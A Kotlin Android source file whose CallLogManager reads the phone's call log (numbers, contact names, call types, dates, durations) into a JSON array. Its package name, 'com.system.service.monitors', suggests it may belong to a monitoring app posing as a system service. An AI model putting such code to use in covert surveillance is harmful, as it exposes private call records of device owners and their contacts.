package com.system.service.monitors

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallLogManager {
    fun getCallLog(context: Context, limit: Int = 50): JSONArray {
        val result = JSONArray()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION
        )
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection, null, null,
            "${CallLog.Calls.DATE} DESC"
        )
        cursor?.use {
            val colNum  = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
            val colName = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
            val colType = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
            val colDate = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
            val colDur  = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
            var count = 0
            while (it.moveToNext() && count < limit) {
                val typeInt = it.getInt(colType)
                val typeStr = when (typeInt) {
                    CallLog.Calls.INCOMING_TYPE  -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE  -> "outgoing"
                    CallLog.Calls.MISSED_TYPE    -> "missed"
                    CallLog.Calls.REJECTED_TYPE  -> "rejected"
                    else -> "unknown"
                }
                result.put(JSONObject().apply {
                    put("number",   it.getString(colNum) ?: "")
                    put("name",     it.getString(colName) ?: "")
                    put("type",     typeStr)
                    put("date",     it.getLong(colDate))
                    put("duration", it.getLong(colDur))
                })
                count++
            }
        }
        return result
    }
}
